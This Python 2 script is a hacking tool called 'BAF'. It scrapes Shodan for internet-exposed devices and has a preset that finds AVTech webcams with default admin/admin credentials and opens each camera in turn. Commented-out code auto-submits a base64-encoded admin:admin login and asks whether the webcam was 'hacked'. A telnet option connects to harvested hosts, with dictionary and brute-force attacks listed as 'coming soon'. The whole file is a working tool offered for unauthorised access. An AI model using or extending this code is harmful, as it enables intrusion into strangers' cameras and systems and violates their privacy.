import requests,time
import httplib, urllib
from bs4 import BeautifulSoup
from selenium import webdriver
import sys
from termcolor import colored
from colored import fg, bg, attr
import telnetlib


###########################################################################

################### used functions to be abstracted later #################

def print_logo():

	print ('%s\n%s' % (fg(1), attr(1)))
	print ('%s  /$$$$$$$    /$$$$$$   /$$$$$$$$ %s' % (fg(1), attr(1)))
	print ('%s | $$__  $$  /$$__  $$ | $$_____/ %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  \ $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$  | $$$$$$$$ | $$$$$    %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$  | $$$$$$$$ | $$$$$    %s' % (fg(1), attr(1)))
	print ('%s | $$__  $$ | $$__  $$ | $$__/    %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$  \ $$ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s | $$$$$$$/ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
	print ('%s |_______/  |__/  |__/ |__/       %s' % (fg(1), attr(1)))
	print "\n"
	print ('%s 	version [0.2.0] %s' % (fg(1), attr('reset')))
 	print "\n"
	return
###########################################################################

def scrab(query,driver):
	ip_lst=[]
	port_lst=[]
	for pagenum in range (1,20) :
		params = urllib.urlencode({'query':query , 'page':pagenum})
		driver.get("https://www.shodan.io/search?%s" % params)
		html = driver.page_source
		soup = BeautifulSoup(html,"lxml")
		if soup.find("div","msg alert alert-info")!="None":
			if soup.find("div","msg alert alert-info") in ['No results found']:
				print "No results found"
				sys.exit()
			else:		
				hi= soup.find("div","ip")
				if hi is None :		
					break
				ip='none'
				por='none'
				for count in range (1,11):
					if hi is None :
						break	
						break
					start=0
					end=0
					coded=False
					if ':' in hi.a['href']:				
							port=True
					else:
						port= False
			
					if hi.a['href'][0:5] in ['https']:
						if port==True and v4_check(hi)==2 :
							ip, por=hi.a['href'][8:].split(':')
						elif port==True and v4_check(hi)!=2 :
							start,end,coded=ipv6_extractor(hi)
							ip, por=hi.a['href'][end:].split(':')
							if coded==False:
								ip=hi.a['href'][start+1:end]
							else:
								ip=hi.a['href'][end+2:]
						else:
							ip=hi.a['href'][8:]
					elif hi.a['href'][0:4] in ['http']:
						if port==True and v4_check(hi)==2:
							ip, por = hi.a['href'][7:].split(':')
						elif port==True and v4_check(hi)!=2:
							start,end,coded=ipv6_extractor(hi)
							ip, por = hi.a['href'][end:].split(':')
							if coded==False:
						
								ip=hi.a['href'][start+1:end]
							else:
							
								ip=hi.a['href'][end+2:]
						else:
							ip=hi.a['href'][7:]
					elif hi.a['href'][0:1]in ['/'] and v4_check(hi)==0:
						if port==True:
							ip, por = hi.a['href'][6:].split(':')
						else:
							ip=hi.a['href'][6:]
					elif hi.a['href'][0:1]in ['/'] and v4_check(hi)!=0:
						start,end,coded_pos=ipv6_extractor(hi)
						ip=hi.a['href'][coded_pos+1:]
					ip_lst.append(str(ip))
					port_lst.append(str(por)) 
					hi=hi.findNext("div","ip")
	return ip_lst,port_lst

###########################################################################

def v4_check(hi):	
	counts=0
	for i in range (0,len(hi.a['href'])):
		if(hi.a['href'][i]==':'or hi.a['href'][i]=='%'):
 			counts=counts+1
	return counts
###########################################################################

def ipv6_extractor(hi):
	start=0
	end=0
	coded_pos=0
	for i in range (0,len(hi.a['href'])):
		if(hi.a['href'][i]=='['):
 			start=i
		if(hi.a['href'][i]==']'):
			end=i
		if(hi.a['href'][i]=='/'):
			coded_pos=i
	
	return start,end,coded_pos
###########################################################################

def prnt_targets(ip_lst):

	n=len(ip_lst)
	print ('%s\n%s' % (fg(1), attr(1)))
	print ('%s  printing ips & ports .. refer to the targets.txt file for processing them with your own flavor ;) %s' % (fg(1), attr('reset')))
	print ('%s\n%s' % (fg(2), attr(1)))
	for i in range(0,n):
		print(i,ip_lst[i],port_lst[i])
		if(i==0):
			with open("output.txt", "w") as text_file:
    				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
		else:
			with open("output.txt", "a") as text_file:
    				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
	return
###########################################################################

def auto_open(ip_lst,port_lst):
 
	n=len(ip_lst)
	lnk=[]
	for i in range(0,n):
		lnk.append("http://"+ip_lst[i]+":"+port_lst[i])
		driver = webdriver.Firefox()
		driver.get(lnk[i])
		choes=raw_input('open the next cam? y/n ')
		if(choes=='y'):
			continue
		else:
			print('type y or ctrl+z to exit')
		
	return
###########################################################################

#proxies in this code used to intercept requests and responses to automate the DOM manipulation process
"""
def my_proxy(PROXY_HOST,PROXY_PORT):
        fp = webdriver.FirefoxProfile()
        # Direct = 0, Manual = 1, PAC = 2, AUTODETECT = 4, SYSTEM = 5
        print "using proxy " + PROXY_HOST +":"+ PROXY_PORT  
        fp.set_preference("network.proxy.type", 1)
        fp.set_preference("network.proxy.http",PROXY_HOST)
        fp.set_preference("network.proxy.http_port",int(PROXY_PORT))
        #fp.set_preference("general.useragent.override","whater_useragent")
        fp.update_preferences()
        return webdriver.Firefox(firefox_profile=fp)

http_proxy  = "127.0.0.1:8080"
proxyDict = { 
              "http"  : http_proxy
            }
"""
###########################################################################

def autologin(ip,port,frst):
	"""
	
	m = requests.Session()
	#driver = my_proxy('127.0.0.1','8080')
	driver = webdriver.Firefox()
	lnk="http://"+ip+":"+port
	driver.get(lnk)
	#driver.execute_script('''var link = arguments[0];window.open("link","_blank");''',lnk)
	logged=driver.execute_script("confirm('ar u logged in with admin/admin?')")
	if logged == True:
		frst=False
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't') 

	elif logged == False:
		if frst == True:
			frst=False
		elif frst == False:
			driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w') 





	cap=raw_input('enter captcha , type none if no captcha ');
								
	if cap != "none":
		print "ur cap is > " + cap
		pars = { 'account': 'YWRtaW46YWRtaW4','captcha_code': cap} 
	else: 
		pars = { 'account': 'YWRtaW46YWRtaW4'}
	"""
	#resp = m.get("%s" % lnk, data=pars) #,proxies=proxyDict)  
	#print resp
	#driver = webdriver.PhantomJS()
	#driver.delete_all_cookies()
	"""key=[]
	value=[]
	for i in range(0,len(m.cookies.get_dict().keys())):
		key.append(str(m.cookies.get_dict().keys()[i]))
		value.append(str(m.cookies.get_dict()[key[i]]))
		driver.add_cookie({'name':key[i], 'value':value[i]})
		print "key="+key[i]+"  "+"value=" + value[i]
	"""
	"""
	hacked=driver.execute_script("return confirm('did the webcam open?')")
	if hacked == True:
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 't') 
		driver.get(lnk)
	elif hacked == False:
		driver.find_element_by_tag_name('body').send_keys(Keys.COMMAND + 'w') 
		driver.close()
	"""
	return 
###########################################################################

def telnet(ch,ip_lst):
	
	if(ch=='1'):
		n=len(ip_lst)
		for i in range(0,n):

			tn = telnetlib.Telnet(ip_lst[i])
			tn.set_debuglevel(10)
			#tn.open(ip_lst[i])
			#tn.write("whoami\n")
			print tn.read_some()
			#tn.close()
	elif(ch=='2'):
		print"coming soon :) press ctrl+z to exit"
	elif(ch=='3'):
		print"coming soon :) press ctrl+z to exit"

	return 
##############################################################################
def auto_auth(driver):

	driver.get("https://shodan.io")
	driver.get("https://goo.gl/jA2sBG")
	time.sleep(2)
	driver.get("https://shodan.io")

	return

def custom_auth(driver):
	#shodan account  auto login
	s = requests.Session()
	name =raw_input("enter your shodan account's username :")
	passwd = raw_input("enter your shodan's account's password :")
	pars = {'username': name, 'password': passwd}
	resp = s.post("https://account.shodan.io/login", data=pars)
	driver.get("https://shodan.io")

	key=[]
	value=[]
	for i in range(0,len(s.cookies.get_dict().keys())):
		key.append(str(s.cookies.get_dict().keys()[i]))
		value.append(str(s.cookies.get_dict()[key[i]]))
		#driver.add_cookie({'name':key[i], 'value':value[i]})
		driver.add_cookie({
			'domain': '.shodan.io', # note the dot at the beginning
			'name':key[i],
			'value':value[i],
			'path': '/',
			'expires': None
		})
	driver.get("https://shodan.io")


	return


################################ main ###########################################


print_logo()
driver = webdriver.PhantomJS(executable_path='/root/node_modules/phantomjs-prebuilt/bin/phantomjs',service_args=['--web-security=false'])
auth_ch = raw_input('\n 1-BAF authentication \n 2-enter your own shodan credentials \n')
if auth_ch in ['1']:
	auto_auth(driver)
elif auth_ch in ['2']:
	custom_auth(driver)
else:
	print('please enter a valid choice')
	driver.quit()
	exit()





#print driver.get_cookies()
#go to the website logged in 	

#print driver.get_log('browser')
#driver.save_screenshot("example.png")
#print driver.get_cookies()
#print driver.get_log('har')
#print driver.page_source


#driver.quit()
#searching for ips and ports on the first 5 pages of the results and storing them in 2 lists (ie:ip&port lists)
ip_lst = []
port_lst = []
choice = raw_input('\n 1-webcams (admin/admin) \n 2-custom search \n 3-test telnet connectivity "underconstruction" \n')



if choice in ['1']:
	query="linux upnp avtech"
	ip_lst,port_lst=scrab(query,driver)
	auto_open(ip_lst,port_lst)
	driver.quit()
	exit()

elif choice in ['2']:
	cs_ch=raw_input('what do you wanna search for? ')
	query=cs_ch
	ip_lst,port_lst=scrab(query,driver)
	prnt_targets(ip_lst)
	driver.quit()
	exit()
else:
	print('please enter a valid choice')
	driver.quit()
	exit()
"""elif choice in ['3']:
	query="telnet"
	ip_lst,port_lst=scrab(query,driver)
	ch=raw_input('\n 1-anonymous login \n 2-dictionary attack "coming soon" \n 3-brute force attack "coming soon" \n')
	telnet(ch,ip_lst)
	driver.quit()
	exit()"""






